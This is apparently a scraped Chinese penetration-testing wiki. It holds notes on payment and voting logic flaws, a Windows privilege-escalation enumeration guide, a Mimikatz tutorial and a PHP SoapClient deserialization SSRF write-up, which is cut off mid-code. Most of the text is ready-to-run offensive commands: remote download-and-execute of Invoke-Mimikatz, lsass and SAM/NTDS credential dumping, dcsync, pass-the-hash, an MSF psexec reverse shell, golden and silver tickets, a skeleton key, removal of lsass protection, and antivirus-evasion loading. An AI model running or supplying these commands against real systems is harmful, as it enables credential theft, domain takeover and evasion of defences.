该方式是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用POST或GET的方式。商户网站接收异部参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额、订单信息是否与发起支付时一致，验证正常则对订单进行状态处理或为用户进行网站内入账等； 分类1.修改支付价格 支付三步曲——订购、下单、付款 •三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么你可在最后一步付款时进行抓包尝试修改金额，如果没有在最后一步做好检验，那么问题就会存在，其修改的金额值你可以尝试小数目或者尝试负数。 2.修改订单数量 很简单，就是本来一笔订单5块钱，可以尝试把订单修改为负数 3.修改附属值(优惠券) 优惠劵主要用来打折或者抵扣现金，一般用优惠劵进行消费一般出现在第二个步骤当中：确认购买信息，在这个步骤页面当中，你可以选择相关优惠劵，然后直接修改金额大于或等于商品的价格就可以，或者直接修改其为负值进行尝试，最后进行支付，如果对这点没有加以验证，那么 问题就会产生，直接支付成功。 4.越权支付 例如：usernameXXXXX，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付你的商品； 5.无限制试用 在支付的时候它URL后面的支付接口是3，而试用接口是4，那么此时你已经使用过了，复制下确认试用时的URL，修改后面的支付接口为3，那么此时就会调用购买支付接口，但是由于你本身这个产品就是试用的，其相应值绑定了这个试用商品，那么金额就肯定是0，那么最后点击支付，你就可以看到支付成功，试用成功，又重复试用了一次，然后他们的试用时间会累加在一起，这就导致了可无限制购买任何产品了。 6.修改支付接口 一些网站支持很多种支付，比如自家的支付工具，第三方的支付工具，然后每个支付接口值不一样，如果逻辑设计不当，当我随便选择一个点击支付时进行抓包，然后修改其支付接口为一个不存在的接口，如果没做好不存在接口相关处理，那么此时就会支付成功； 7.多重替换 首先去产生两个订单，这两个订单商品是不一样的，其价格不一样，如果服务端没有做好这相关的验证，那么在支付的过程当中抓包，修改其订单值为另一个订单值，最后支付，这时就可以用订单一的支付价格买到订单而的商品； 防御Ø 后端检查每一项值，包括支付状态； Ø 校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量； Ø 与第三方支付平台检查，实际支付的金额是否与订单金额一致； Ø 支付参数进行MD5 加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题； Ø 金额超过阈值，进行人工审核 ； 投票积分抽奖漏洞投票和抽奖以及积分在很多促销活动或者推广手段上都经常用到，背后的奖品成本可能上数十万，如果这些奖品被恶意用户刷走了，不仅推广的效果没有，而且浪费了成本投入。 不管是投票、积分还是抽奖，都存在一个公共点：即单个用户次数存在限制，比如一场活动中一个用户只能抽奖一次。这样的限制也会存在很多绕过方式。 利用方法1.cookie和POST请求正文绕过 有的应用将验证是否抽奖或者领取积分的判断值放置在cookie或者POST的请求正文里，服务器端获取到这个结果后判断是否还有机会抽奖，而这个数据我们是可以直接在数据包中修改的，所以就会产生绕过，比如cookie中isok1代表已经抽奖，isok0代表还没有抽奖， 而我们只要再点击抽奖，然后把isok的值改为0即可一直抽奖。 2.基于IP验证 做的比较弱的统计是直接基于IP验证，像访问量、推广获取积分等，这类要看程序获取IP的方式，如果是client-ip或者x_forword_for获取IP，则可以直接伪造IP绕过。 3.基于用户认证 也有一部分应用需要登陆以后才能抽奖或者投票，这类可以结合看看能不能批量注册，如果可以，则可以用程序实现批量登陆刷票，或者投票的时候POST包或者cookie里面的当前uid\\ 用户名等是否可以随意修改绕过用户单次限制。 防御方法从上面利用手段可以看到主要的三个点是IP、登录用户和cookie、分析出可用性较高的防御 手段如下： Ø 机器识别码验证，每台机器都可以根据硬件信息生成唯一的识别码。 Ø 操作需要登陆，当前用户信息从session中读取。"},{"path":"/wiki/内网/提权/Win_信息收集.html","content":"指南概述在每个部分中，我首先提供老的可靠的CMD命令，然后是一个Powershell实现的的等价命令。同时拥有这两种工具是非常好的，Powershell比传统的CMD更加灵活。然而，没有一个Powershell命令能等价于所有东西（或者CMD在某些事情上仍然更简单更好），所以一些部分将只包含常规的CMD命令。 操作系统操作系统类型和架构？它是否缺少任何补丁？ systeminfowmic qfe 环境变量有什么有趣的地方吗？域控制器在LOGONSERVER？ setGet-ChildItem Env: | ft Key,Value 有没有其他连接的驱动器？ net usewmic logicaldisk get caption,description,providernameGet-PSDrive | where $_.Provider -like Microsoft.PowerShell.Core\\FileSystem| ft Name,Root 用户 你是谁？ whoamiecho %USERNAME%$env:UserName 系统上有哪些用户？任何旧的用户配置文件没有被清理掉？ net usersdir /b /ad C:\\Users\\dir /b /ad C:\\Documents and Settings\\ # Windows XP and belowGet-LocalUser | ft Name,Enabled,LastLogonGet-ChildItem C:\\Users -Force | select Name 是否有其他人登录？ qwinsta 系统上有哪些用户组？ net localgroupGet-LocalGroup | ft Name 在管理员组中有哪些用户？ net localgroup AdministratorsGet-LocalGroupMember Administrators | ft Name, PrincipalSource 用户自动登录对应的注册表中有些什么内容？ reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon 2nul | findstr DefaultUserName DefaultDomainName DefaultPasswordGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon | select Default* Credential Manager中有什么有趣的东西？ cmdkey /list 我们可以访问SAM和SYSTEM文件吗？ %SYSTEMROOT%\\repair\\SAM%SYSTEMROOT%\\System32\\config\\RegBack\\SAM%SYSTEMROOT%\\System32\\config\\SAM%SYSTEMROOT%\\repair\\system%SYSTEMROOT%\\System32\\config\\SYSTEM%SYSTEMROOT%\\System32\\config\\RegBack\\system 程序，进程和服务 系统都安装了些什么软件？ dir /a C:\\Program Filesdir /a C:\\Program Files (x86)reg query HKEY_LOCAL_MACHINE\\SOFTWAREGet-ChildItem C:\\Program Files, C:\\Program Files (x86) | ft Parent,Name,LastWriteTimeGet-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name 有没有权限设置的比较脆弱的文件夹或文件的权限？ 在程序文件夹中（Program Folders）有哪些文件或文件夹赋予了所有人（Everyone）或用户（User）的完全权限？ icacls C:\\Program Files\\* 2nul | findstr (F) | findstr Everyoneicacls C:\\Program Files (x86)\\* 2nul | findstr (F) | findstr Everyone icacls C:\\Program Files\\* 2nul | findstr (F) | findstr BUILTIN\\Usersicacls C:\\Program Files (x86)\\* 2nul | findstr (F) | findstr BUILTIN\\Users 修改程序文件夹（Program Folders）中的所有人（Everyone）或用户（User）的权限？ icacls C:\\Program Files\\* 2nul | findstr (M) | findstr Everyoneicacls C:\\Program Files (x86)\\* 2nul | findstr (M) | findstr Everyone icacls C:\\Program Files\\* 2nul | findstr (M) | findstr BUILTIN\\Usersicacls C:\\Program Files (x86)\\* 2nul | findstr (M) | findstr BUILTIN\\UsersGet-ChildItem C:\\Program Files\\*,C:\\Program Files (x86)\\* | % try Get-Acl $_ -EA SilentlyContinue | Where ($_.Access|select -ExpandProperty IdentityReference) -match Everyone catch Get-ChildItem C:\\Program Files\\*,C:\\Program Files (x86)\\* | % try Get-Acl $_ -EA SilentlyContinue | Where ($_.Access|select -ExpandProperty IdentityReference) -match BUILTIN\\Users catch 你也可以上传Sysinternals中的accesschk来检查可写文件夹和文件。 accesschk.exe -qwsu Everyone *accesschk.exe -qwsu Authenticated Users *accesschk.exe -qwsu Users * 系统上正在运行的进程服务有哪些？有没有暴露的内部服务？如果是这样，我们可以打开它吗？请参阅附录中的端口转发。 tasklist /svctasklist /vnet startsc queryGet-Process | ft ProcessName,IdGet-Service 是否存在任何脆弱的服务权限？我们可以重新配置什么吗？你可以再次上传accesschk来检查权限。 accesschk.exe -uwcqv Everyone *accesschk.exe -uwcqv Authenticated Users *accesschk.exe -uwcqv Users * 有没有引用的服务路径？ wmic service get name,displayname,pathname,startmode 2nul |findstr /i Auto 2nul |findstr /i /v C:\\Windows\\\\ 2nul |findstr /i /v 是否设置了计划任务？任何自定义实现的计划任务？ schtasks /query /fo LIST 2nul | findstr TaskNamedir C:\\windows\\tasksGet-ScheduledTask | ft TaskName, State 系统启动时都运行了些什么？ wmic startup get caption,commandreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Runreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOncereg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOncedir C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startupdir C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\StartupGet-CimInstance Win32_StartupCommand | select Name, command, Location, User | flGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceGet-ItemProperty -Path Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunGet-ItemProperty -Path Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceGet-ChildItem C:\\Users\\All Users\\Start Menu\\Programs\\StartupGet-ChildItem C:\\Users\\$env:USERNAME\\Start Menu\\Programs\\Startup AlwaysInstallElevated是否启用？我没有跑过这个，但没有伤害检查。 reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 网络 连接到了哪一块网卡？是否有多个网络？ ipconfig /allGet-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address 我们有哪些网络路线？ route printGet-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex ARP缓存中有什么？ arp -aGet-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State 是否有连接到其他主机的网络连接？ netstat -ano hosts文件中的任何东西？ C:\\WINDOWS\\System32\\drivers\\etc\\hosts 防火墙是否打开？如果是又是怎样配置的？ netsh firewall show statenetsh firewall show confignetsh advfirewall firewall show rule name=allnetsh advfirewall export firewall.txt 任何其他有趣的接口配置？ netsh dump 有没有SNMP配置？ reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /sGet-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse 有趣的文件和敏感信息 这部分内容的命令输出可能有点杂乱，所以你可能想把命令的输出重定向到txt文件中进行审查和解析。 在注册表中是否有任何密码？ reg query HKCU /f password /t REG_SZ /sreg query HKLM /f password /t REG_SZ /s 查看是否存在没有清理掉的sysprep或unattended文件？ dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2nulGet-Childitem –Path C:\\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where ($_.Name -like *.xml -or $_.Name -like *.txt -or $_.Name -like *.ini) 如果服务器是IIS网络服务器，那么inetpub中有什么？以及任何隐藏的目录？web.config文件？ dir /a C:\\inetpub\\dir /s web.configC:\\Windows\\System32\\inetsrv\\config\\applicationHost.configGet-Childitem –Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue 在IIS日志目录中有些什么文件？ C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex[YYMMDD].logC:\\inetpub\\logs\\LogFiles\\W3SVC2\\u_ex[YYMMDD].logC:\\inetpub\\logs\\LogFiles\\FTPSVC1\\u_ex[YYMMDD].logC:\\inetpub\\logs\\LogFiles\\FTPSVC2\\u_ex[YYMMDD].log 是否安装了XAMPP，Apache或PHP？任何有XAMPP，Apache或PHP配置文件？ dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnfGet-Childitem –Path C:\\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue 系统中是否存在任何Apache网络日志？ dir /s access.log error.logGet-Childitem –Path C:\\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue 系统中是否任何有趣的文件？可能在用户目录（桌面，文档等）？ dir /s *pass* == *vnc* == *.config* 2nulGet-Childitem –Path C:\\Users\\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue 系统中是否有包含密码的文件？ findstr /si password *.xml *.ini *.txt *.config 2nulGet-ChildItem C:\\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern password 附录传输文件 在特权升级过程中的某个时候，你需要将文件放到你的目标上。下面是一些简单的方法来做到这一点。 Powershell Cmdlet（Powershell 3.0及更高版本） Invoke-WebRequest https://myserver/filename -OutFile C:\\Windows\\Temp\\filename Powershell一行代码实现方法： (New-Object System.Net.WebClient).DownloadFile(https://myserver/filename, C:\\Windows\\Temp\\filename) Powershell脚本 echo $webclient = New-Object System.Net.WebClient wget.ps1echo $url = http://IPADDRESS/file.exe wget.ps1echo $file = output-file.exe wget.ps1echo $webclient.DownloadFile($url,$file) wget.ps1 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 通过文本文件的非交互式FTP。当你只有有限的命令执行时这很有用。 echo open 10.10.10.11 21 ftp.txtecho USER username ftp.txtecho mypassword ftp.txtecho bin ftp.txtecho GET filename ftp.txtecho bye ftp.txt ftp -v -n -s:ftp.txtCERTUTIL certutil.exe -urlcache -split -f https://myserver/filename outputfilename 转发端口 这对于暴露机器外部不可用的内部服务非常有用，通常是由于防火墙设置。 上传plink.exe到目标。 在攻击机器上启动SSH。 例如要公开SMB，在目标上运行： plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS 注意：从Windows 10的秋季创作者更新版本开始，OpenSSH已经在Windows的beta版本中推出，所以我预计有一天我们可能只能使用普通的旧的SSH命令进行端口转发，具体取决于是否启用。 本地文件包含列表 这不是一个详尽的列表，安装目录会有所不同，我只列出了一些常见的文件路径。 C:\\Apache\\conf\\httpd.confC:\\Apache\\logs\\access.logC:\\Apache\\logs\\error.logC:\\Apache2\\conf\\httpd.confC:\\Apache2\\logs\\access.logC:\\Apache2\\logs\\error.logC:\\Apache22\\conf\\httpd.confC:\\Apache22\\logs\\access.logC:\\Apache22\\logs\\error.logC:\\Apache24\\conf\\httpd.confC:\\Apache24\\logs\\access.logC:\\Apache24\\logs\\error.logC:\\Documents and Settings\\Administrator\\NTUser.datC:\\php\\php.iniC:\\php4\\php.iniC:\\php5\\php.iniC:\\php7\\php.iniC:\\Program Files (x86)\\Apache Group\\Apache\\conf\\httpd.confC:\\Program Files (x86)\\Apache Group\\Apache\\logs\\access.logC:\\Program Files (x86)\\Apache Group\\Apache\\logs\\error.logC:\\Program Files (x86)\\Apache Group\\Apache2\\conf\\httpd.confC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\access.logC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\error.logc:\\Program Files (x86)\\php\\php.iniC:\\Program Files\\Apache Group\\Apache\\conf\\httpd.confC:\\Program Files\\Apache Group\\Apache\\conf\\logs\\access.logC:\\Program Files\\Apache Group\\Apache\\conf\\logs\\error.logC:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.confC:\\Program Files\\Apache Group\\Apache2\\conf\\logs\\access.logC:\\Program Files\\Apache Group\\Apache2\\conf\\logs\\error.logC:\\Program Files\\FileZilla Server\\FileZilla Server.xmlC:\\Program Files\\MySQL\\my.cnfC:\\Program Files\\MySQL\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.1\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.1\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.5\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.5\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.6\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.6\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.7\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.7\\my.iniC:\\Program Files\\php\\php.iniC:\\Users\\Administrator\\NTUser.datC:\\Windows\\debug\\NetSetup.LOGC:\\Windows\\Panther\\Unattend\\Unattended.xmlC:\\Windows\\Panther\\Unattended.xmlC:\\Windows\\php.iniC:\\Windows\\repair\\SAMC:\\Windows\\repair\\systemC:\\Windows\\System32\\config\\AppEvent.evtC:\\Windows\\System32\\config\\RegBack\\SAMC:\\Windows\\System32\\config\\RegBack\\systemC:\\Windows\\System32\\config\\SAMC:\\Windows\\System32\\config\\SecEvent.evtC:\\Windows\\System32\\config\\SysEvent.evtC:\\Windows\\System32\\config\\SYSTEMC:\\Windows\\System32\\drivers\\etc\\hostsC:\\Windows\\System32\\winevt\\Logs\\Application.evtxC:\\Windows\\System32\\winevt\\Logs\\Security.evtxC:\\Windows\\System32\\winevt\\Logs\\System.evtxC:\\Windows\\win.iniC:\\xampp\\apache\\conf\\extra\\httpd-xampp.confC:\\xampp\\apache\\conf\\httpd.confC:\\xampp\\apache\\logs\\access.logC:\\xampp\\apache\\logs\\error.logC:\\xampp\\FileZillaFTP\\FileZilla Server.xmlC:\\xampp\\MercuryMail\\MERCURY.INIC:\\xampp\\mysql\\bin\\my.iniC:\\xampp\\php\\php.iniC:\\xampp\\security\\webdav.htpasswdC:\\xampp\\sendmail\\sendmail.iniC:\\xampp\\tomcat\\conf\\server.xml"},{"path":"/wiki/内网/提权/Mimikatz教程.html","content":"0x00 简介Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！ 注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。 这里放几个神器的运行姿势：九种姿势运行：Mimikatz：https://www.freebuf.com/articles/web/176796.html 借用PowerShell Copy#读取密码明文(需要管理员权限)powershell IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1); Invoke-Mimikatz –DumpCerts Copy#读取密码hash值(需要管理员权限)powershell IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1);Get-PassHashes 0x01 获取本地帐户密码1.1 本地执行下载mimikatz程序，找到自己系统对应的位数，右键以管理员身份运行： Copy#提升权限privilege::debug#抓取密码sekurlsa::logonpasswords 当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。 cmd修改注册表命令： Copyreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f#重启或用户重新登录后可以成功抓取 1.2 SAM表获取hashCopy#导出SAM数据reg save HKLM\\SYSTEM SYSTEMreg save HKLM\\SAM SAM#使用mimikatz提取hashlsadump::sam /sam:SAM /system:SYSTEM 0x02 Procdump+Mimikatz当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe: Copyprocdump64.exe -accepteula -ma lsass.exe lsass.dmp 将lsass.dmp下载到本地后，然后执行mimikatz: Copymimikatz.exe sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords full exit 为了方便复制与查看，可以输出到本地文件里面： Copymimikatz.exe sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords full pssword.txt 0x03 读取域控中域成员Hash3.1 域控本地读取注：得在域控上以域管理员身份执行mimikatz 方法一：直接执行 Copy#提升权限privilege::debug抓取密码lsadump::lsa /patch 方法二：通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取： Copy#获取所有域用户lsadump::dcsync /domain:test.com /all /csv#指定获取某个用户的hashlsadump::dcsync /domain:test.com /user:test 3.2 导出域成员HashCopy 域账户的用户名和hash密码以域数据库的形式存放在域控制器的 font style=color:rgb(192, 52, 29);background-color:rgba(0, 0, 0, 0.04);%SystemRoot% tds\\NTDS.DIT/font 文件中。 这里可以借助：ntdsutil.exe，域控制器自带的域数据库管理工具，我们可以通过域数据库，提取出域中所有的域用户信息，在域控上依次执行如下命令，导出域数据库： Copy#创建快照ntdsutil snapshot activate instance ntds create quit quit#加载快照ntdsutil snapshot mount 72ba82f0-5805-4365-a73c-0ccd01f5ed0d quit quit#Copy文件副本copy C:\\$SNAP_201911211122_VOLUMEC$\\windows\\NTDS tds.dit c: tds.dit 将ntds.dit文件拷贝到本地利用impacket脚本dump出Hash： Copysecretsdump.py -ntds.dit -system system.hive LOCAL 除了借助python，还有一个NTDSDumpEx（会被360查杀的哦）： 工具地址：https://github.com/zcgonvh/NTDSDumpEx/releases CopyNTDSDumpEx -d ntds.dit -o domain.txt -s system.hiv (system.hive文件获取:reg save hklm\\system system.hive)NTDSDumpEx -d ntds.dit -o domain.txt -r (此命令适用于在域控本地执行) 最后记得卸载删除快照： Copyntdsutil snapshot unmount 72ba82f0-5805-4365-a73c-0ccd01f5ed0d quit quitntdsutil snapshot delete 72ba82f0-5805-4365-a73c-0ccd01f5ed0d quit quit 3.3 secretsdump脚本直接导出域hash为什么要再提一遍secretsdump呢，因为它可以直接导出，说白了，简单粗暴： Copypython secretsdump.py rabbitmask:123456@192.168.15.181 首先它会导出本地SAM中的hash，然后是所有域内用户的IP，全部获取成功 0x04 哈希传递攻击PTH4.1 工作组环境当我们获得了一台主机的NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。 Copy#使用administrator用户的NTLM哈希值进行攻击sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9 Copy#使用xie用户的NTLM哈希值进行攻击sekurlsa::pth /user:xie /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9 在弹出的cmd窗口，我们直接可以连接该主机，并且查看该主机下的文件夹。 或者可以直接将该主机的C盘映射到本地的K盘。 注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令。 4.2 域环境在域环境中，当我们获得了域内用户的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机的本地 administrator 权限和获得了域用户的NTLM哈希值 域：xie.com域控：WIN2008.xie.com Copy#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击sekurlsa::pth /user:administrator /domain:xie.com /ntlm:dbd621b8ed24eb627d32514476fac6c5 Copy#使用域用户xie的NTLM哈希值对域控进行哈希传递攻击sekurlsa::pth /user:xie /domain:xie.com /ntlm:329153f560eb329c0e1deea55e88a1e9 4.3 MSF进行哈希传递Copy 有些时候，当我们获取到了某台主机的Administrator用户的LM-Hash和 NTLM-Hash ，并且该主机的445端口打开着。我们则可以利用 font style=color:rgb(192, 52, 29);background-color:rgba(0, 0, 0, 0.04);exploit/windows/smb/psexec/font 漏洞用MSF进行远程登录(哈希传递攻击)。(只能是administrator用户的LM-hash和NTLM-hash)，这个利用跟工作组环境或者域环境无关。 Copymsf use exploit/windows/smb/psexecmsf exploit(psexec) set payload windows/meterpreter/reverse_tcpmsf exploit(psexec) set lhost 192.168.10.27msf exploit(psexec) set rhost 192.168.10.14msf exploit(psexec) set smbuser Administratormsf exploit(psexec) set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6 #这里LM和NTLM我们已经获取到了msf exploit(psexec) exploit 0x05 票据传递攻击(PTT)5.1 黄金票据域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。 首先获取krbtgt的用户hash: Copymimikatz lsadump::dcsync /domain:xx.com /user:krbtgt 利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下： Copykerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi Copy#导入刚才生成的票据kerberos::ptt test.kiribi#导入成功后可获取域管权限dir \\\\dc.abc.com\\c$ 5.2 白银票据黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信 白银票据：伪造 TGS ，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信 Copy#在域控上导出 DC$ 的 HASHmimikatz log privilege::debug sekurlsa::logonpasswords#利用 DC$ 的 Hash制作一张 cifs 服务的白银票据kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt#cifs是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统dir \\\\DC.ABC.COM\\C$ 5.3 skeleton keyskeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。 Copy#在域控上安装 skeleton keymimikatz.exe privilege::debug misc::skeleton#在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatznet use \\\\WIN-9P499QKTLDO.adtest.com\\c$ mimikatz /user:adtest\\administrator 微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。 Copy#适用系统windows 8.1windows server 2012 及以上 当然 mimikatz 依旧可以绕过，该功能需要导入mimidrv.sys文件，导入命令如下: Copyprivilege::debug!+!processprotect /process:lsass.exe /remove misc::skeleton 5.4 MS14-068当我们拿到了一个普通域成员的账号后，想继续对该域进行渗透，拿到域控服务器权限。如果域控服务器存在 MS14_068 漏洞，并且未打补丁，那么我们就可以利用 MS14_068 快速获得域控服务器权限。 MS14-068编号 CVE-2014-6324，补丁为 3011780 ，如果自检可在域控制器上使用命令检测。 Copysysteminfo |find 3011780#为空说明该服务器存在MS14-068漏洞 操作链接：MS14-068复现(CVE-2014-6324)：https://www.cnblogs.com/-mo-/p/11890539.html 0x06 其他6.1 使用mimikatz导出chrome中的密码详情请见：链接 6.2 隐藏功能管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能： Copyprivilege::debugmisc::cmdmisc::regeditmisc::taskmgr 6.3 免杀处理Powersploit中提供的很多工具都是做过加密处理的，同时也提供了一些用来加密处理的脚本，Out-EncryptedScript就是其中之一。 首先在本地对Invoke-Mimikatz.ps1进行加密处理： Copypoweshell.exe Import-Module .\\Out-EncryptedScript.ps1poweshell.exe Out-EncryptedScript -ScriptPath .\\Invoke-Mimikatz.ps1 -Password 密码 -Salt 随机数#默认生成的文件是evil.ps1-Password 设置加密的密钥-Salt 随机数，防止被暴力破解 将加密生成的evil.sp1脚本放在目标机上，执行如下命令： Copy#远程加载解密脚本poweshell.exe IEX(New-Object Net.WebClient).DownloadString(http://1.1.1.32/PowerSploit/ScriptModification/Out-EncryptedScript.ps1)[String] $cmd = Get-Content .\\evil.ps1Invoke-Expression $cmd$decrypted = de password saltInvoke-Expression $decryptedInvoke-Mimikatz"},{"path":"/wiki/WP/反序列化/php/Deserialization + __call + SoapClient + CRLF = SSRF.html","content":"php中的内置类?php$classes = get_declared_classes();foreach ($classes as $class) $methods = get_class_methods($class); foreach ($methods as $method) if (in_array($method, array( __destruct, __toString, __wakeup, __call, __callStatic, __get, __set, __isset, __unset, __invoke, __set_state ))) print $class . :: . $method . ; 首先测试下正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法 ?php$a = new SoapClient(null,array(uri=bbb, location=http://127.0.0.1:5555/path));$b = serialize($a);echo $b;$c = unserialize($b);$c-not_exists_function(); CRLF漏洞从上图可以看到，SOAPAction处可控，可以把\\x0d\\x0a注入到SOAPAction，POST请求的header就可以被控制 ?php$a = new SoapClient(null,array(uri=bbb\\r \\r ccc\\r , location=http://127.0.0.1:5555/path));$b = serialize($a);echo $b;$c = unserialize($b);$c-not_exists_function(); 但Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据 在header里User-Agent在Content-Type前面 https://www.php.net/manual/zh/soapclient.soapclient.php : The user_agent option specifies string to use in User-Agent header. user_agent同样可以注入CRLF，控制Content-Type的值 wupco ?php$target = http://127.0.0.1:5555/path;$post_string = data=something;$headers = array( X-Forwarded-For: 127.0.0.1, Cookie: PHPSESSID=my_session );$b = new SoapClient(null,array(location = $target,user_agent=wupco^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: .(string)strlen($post_string).^^^^.$post_string,uri = aaab));$aaa = serialize($b);$aaa = str_replace(^^,\\r ,$aaa);$aaa = str_replace(,,$aaa);echo $aaa;$c = 